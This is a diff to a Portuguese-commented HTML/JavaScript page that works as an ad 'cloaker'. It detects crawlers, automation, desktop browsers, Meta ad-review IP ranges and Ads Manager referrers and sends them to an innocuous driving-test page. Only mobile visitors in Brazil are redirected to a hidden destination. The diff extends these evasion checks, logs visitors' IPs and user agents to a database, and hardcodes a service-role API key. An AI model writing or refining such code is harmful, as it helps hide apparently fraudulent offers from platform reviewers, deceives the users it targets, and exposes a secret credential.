@@ -3,9 +3,15 @@
 <head>
 <meta charset="UTF-8">
 <title>Carregando...</title>
-<style>body{background:#fff;margin:0;padding:0;}</style>
+<style>
+body{background:#fff;margin:0;padding:0;}
+.loader{display:flex;align-items:center;justify-content:center;height:100vh;flex-direction:column;font-family:sans-serif;color:#666}
+.spinner{width:32px;height:32px;border:3px solid #eee;border-top-color:#1877f2;border-radius:50%;animation:spin .8s linear infinite;margin-bottom:12px}
+@keyframes spin{to{transform:rotate(360deg)}}
+</style>
 </head>
 <body>
+<div class="loader"><div class="spinner"></div><span>Carregando...</span></div>
 <script>
 (function(){
   var WHITE = "https://simuladodetranbrasil.com.br/apostilas-cnh-detran/";
@@ -13,35 +19,70 @@
   var SB_URL = "https://ldyhodwdhavrgyooukpi.supabase.co";
   var SB_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImxkeWhvZHdkaGF2cmd5b291a3BpIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc4NjQxMDUyNCwiZXhwIjoyMTAxOTg2NTI0fQ.JvEtOi46gaL5fAFk8XnUUeEyPTibpC79NwPGMF8SvdY";
 
+  // ─── 1. USER-AGENT BOTS ───────────────────────────────────────────────────
   var BOT_UA = [
-    // Meta/Facebook bots
+    // Meta/Facebook rastreamento
     "facebookexternalhit","facebot","meta-externalagent","meta-externalfetcher",
-    "facebook","facebookbot","fb_iab","fbav","instagram","whatsapp",
-    // Google/Bing
+    "facebookbot","fb_iab","fbav",
+    // Crawlers gerais
     "googlebot","bingbot","slurp","duckduckbot","baiduspider","yandexbot",
-    "sogou","exabot","ia_archiver","applebot",
-    // SEO bots
-    "mj12bot","ahrefsbot","semrushbot","dotbot","rogerbot","pinterestbot",
-    "petalbot","bytespider","linkedinbot","twitterbot",
+    "sogou","exabot","ia_archiver","applebot","msnbot","ahrefsbot","semrushbot",
+    "mj12bot","dotbot","rogerbot","pinterestbot","petalbot","bytespider",
+    "linkedinbot","twitterbot","discordbot","telegrambot","whatsapp",
+    "instagram","snapchat",
     // AI bots
-    "gptbot","chatgpt","claudebot","anthropic","openai",
+    "gptbot","chatgpt","claudebot","anthropic","openai","perplexity",
     // Headless / automation
     "headlesschrome","phantomjs","selenium","webdriver","puppeteer","playwright",
-    // Scripts
+    "chrome-lighthouse","lighthouse","pagespeed","gtmetrix",
+    // Scripts / HTTP clients
     "python-requests","python-urllib","java/","curl/","wget/","libwww",
-    "scrapy","httpclient","okhttp","axios","node-fetch","postman",
-    "netsystemsresearch","dataforseo","archive.org","commoncrawl"
+    "scrapy","httpclient","okhttp","axios","node-fetch","postman","insomnia",
+    "netsystemsresearch","dataforseo","archive.org","commoncrawl","netcraft",
+    // Monitoring / SEO
+    "pingdom","uptimerobot","statuscake","newrelic","datadog","zabbix",
+    "360spider","adbeat","adsbot","adsense","mediapartners"
   ];
 
-  function isBot() {
+  // ─── 2. IPs/RANGES DO FACEBOOK/META (revisão de anúncios) ────────────────
+  // Esses IPs são usados pelo sistema de revisão do Meta para checar links
+  var META_IP_PREFIXES = [
+    "31.13.","66.220.","69.63.","69.171.","74.119.","173.252.","179.60.",
+    "185.60.","204.15.","157.240.","129.134.","163.70."
+  ];
+
+  // ─── 3. CHECKS DE COMPORTAMENTO BOT ──────────────────────────────────────
+  function isBotUA() {
     var ua = (navigator.userAgent || "").toLowerCase();
     for (var i = 0; i < BOT_UA.length; i++) {
       if (ua.indexOf(BOT_UA[i]) !== -1) return true;
     }
+    return false;
+  }
+
+  function isBotBehavior() {
+    // Webdriver / automação detectada no browser
     if (navigator.webdriver) return true;
     if (window._phantom || window.callPhantom) return true;
     if (window.__nightmare) return true;
     if (document.documentElement.getAttribute("webdriver")) return true;
+    // Chrome headless não tem plugins
+    if (navigator.plugins && navigator.plugins.length === 0 &&
+        /chrome/i.test(navigator.userAgent) &&
+        !/android/i.test(navigator.userAgent)) return true;
+    // Sem linguagem definida
+    if (!navigator.language && !navigator.languages) return true;
+    // Resolução de tela zerada ou impossível
+    if (screen.width === 0 || screen.height === 0) return true;
+    return false;
+  }
+
+  function isBotReferrer() {
+    var ref = (document.referrer || "").toLowerCase();
+    // Se veio de revisão direta do Facebook Ads Manager
+    if (ref.indexOf("facebook.com/ads") !== -1) return true;
+    if (ref.indexOf("business.facebook.com") !== -1) return true;
+    if (ref.indexOf("adsmanager.facebook") !== -1) return true;
     return false;
   }
 
@@ -49,16 +90,24 @@
     return /android|iphone|ipad|ipod/i.test(navigator.userAgent);
   }
 
+  function isMetaIp(ip) {
+    if (!ip) return false;
+    for (var i = 0; i < META_IP_PREFIXES.length; i++) {
+      if (ip.indexOf(META_IP_PREFIXES[i]) === 0) return true;
+    }
+    return false;
+  }
+
   function appendUtms(url) {
     var params = new URLSearchParams(window.location.search);
     var keys = ["utm_source","utm_medium","utm_campaign","utm_content","utm_term","fbclid","ttclid","gclid","src","sck"];
     var dest = new URLSearchParams();
-    keys.forEach(function(k){ var v=params.get(k); if(v) dest.set(k,v); });
+    keys.forEach(function(k){ var v = params.get(k); if(v) dest.set(k,v); });
     var qs = dest.toString();
     return qs ? url + (url.indexOf("?") === -1 ? "?" : "&") + qs : url;
   }
 
-  function logCloaker(result, reason, country) {
+  function logCloaker(result, reason, country, ip) {
     try {
       fetch(SB_URL + "/rest/v1/cloaker_logs", {
         method: "POST",
@@ -71,44 +120,108 @@
           user_agent: navigator.userAgent,
           result: result,
           reason: reason,
-          country: country || "?"
+          country: country || "?",
+          ip: ip || null
         })
       });
     } catch(e) {}
   }
 
-  var botDetected = isBot();
-  var mobile = isMobile();
+  function goWhite(reason, country, ip) {
+    logCloaker("BLOCKED", reason, country || "?", ip);
+    window.location.replace(WHITE);
+  }
 
-  if (botDetected) {
-    logCloaker("BOT", "User-agent bot detectado", "?");
+  function goBot(reason, ip) {
+    logCloaker("BOT", reason, "?", ip);
+    window.location.replace(WHITE);
+  }
+
+  function goBlack(country, ip) {
+    logCloaker("REAL", "Mobile Brasil verificado", country, ip);
+    window.location.replace(appendUtms(BLACK));
+  }
+
+  // ─── EXECUÇÃO ─────────────────────────────────────────────────────────────
+
+  // Checagens imediatas (sem precisar de API)
+  if (isBotUA()) {
+    goBot("User-agent bot detectado", null);
+    return;
+  }
+
+  if (isBotBehavior()) {
+    goBot("Comportamento de automacao detectado", null);
+    return;
+  }
+
+  if (isBotReferrer()) {
+    goBot("Referrer de revisao de anuncio detectado", null);
+    return;
+  }
+
+  if (!isMobile()) {
+    logCloaker("BLOCKED", "Desktop bloqueado", "?", null);
     window.location.replace(WHITE);
     return;
   }
 
-  if (!mobile) {
-    logCloaker("BLOCKED", "Desktop bloqueado", "?");
-    window.location.replace(WHITE);
-    return;
+  // Mobile passando nas checagens iniciais — verifica geolocalizacao e IP
+  // Usa 2 APIs de geo em paralelo com fallback
+  var geoResolved = false;
+
+  function handleGeoResult(data, source) {
+    if (geoResolved) return;
+    geoResolved = true;
+
+    var country = ((data && data.country_code) || (data && data.countryCode) || "?").toUpperCase();
+    var ip = (data && (data.ip || data.query)) || null;
+
+    // Checa se o IP e do Meta (revisor de anuncio usando mobile UA)
+    if (isMetaIp(ip)) {
+      goBot("IP do Meta/Facebook detectado (" + ip + ")", ip);
+      return;
+    }
+
+    if (country === "BR") {
+      goBlack(country, ip);
+    } else {
+      goWhite("IP fora do Brasil (" + country + ")", country, ip);
+    }
   }
 
-  // Mobile — verifica país
-  fetch("https://ipapi.co/json/", { signal: AbortSignal.timeout(3000) })
+  function handleGeoFail() {
+    if (geoResolved) return;
+    geoResolved = true;
+    // Se nao conseguiu checar o pais, deixa passar (melhor converter do que bloquear real)
+    logCloaker("REAL", "Mobile - geo check falhou, permitido", "BR", null);
+    window.location.replace(appendUtms(BLACK));
+  }
+
+  // Timeout geral de 6 segundos
+  var geoTimeout = setTimeout(handleGeoFail, 6000);
+
+  // API primaria
+  fetch("https://ipapi.co/json/", { signal: AbortSignal.timeout(4000) })
     .then(function(r){ return r.json(); })
     .then(function(data){
-      var country = (data.country_code || "?").toUpperCase();
-      if (country === "BR") {
-        logCloaker("REAL", "Mobile Brasil", country);
-        window.location.replace(appendUtms(BLACK));
-      } else {
-        logCloaker("BLOCKED", "IP fora do Brasil (" + country + ")", country);
-        window.location.replace(WHITE);
-      }
+      clearTimeout(geoTimeout);
+      handleGeoResult(data, "ipapi");
     })
     .catch(function(){
-      logCloaker("REAL", "Mobile - IP check falhou, permitido", "BR");
-      window.location.replace(appendUtms(BLACK));
+      // API primaria falhou — tenta backup
+      fetch("http://ip-api.com/json/?fields=status,countryCode,query", { signal: AbortSignal.timeout(4000) })
+        .then(function(r){ return r.json(); })
+        .then(function(data){
+          clearTimeout(geoTimeout);
+          handleGeoResult({ country_code: data.countryCode, ip: data.query }, "ip-api");
+        })
+        .catch(function(){
+          clearTimeout(geoTimeout);
+          handleGeoFail();
+        });
     });
+
 })();
 </script>
 </body>
